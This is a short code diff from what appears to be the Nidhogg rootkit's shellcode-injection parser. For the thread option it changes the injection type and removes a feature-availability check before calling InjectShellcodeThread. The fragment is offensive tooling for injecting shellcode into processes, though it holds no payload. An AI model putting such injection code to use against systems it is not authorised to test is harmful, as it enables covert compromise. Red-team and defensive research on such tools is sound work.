@@ -85,12 +85,7 @@ NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARG
 	}
 	case Options::Thread:
 	{
-		shellcodeInfo.Type = InjectionType::NtCreateThreadExInjection;
-
-		if (!Features.CreateThreadInjection) {
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
+		shellcodeInfo.Type = InjectionType::CreateThreadInjection;
 
 		status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
 		break;
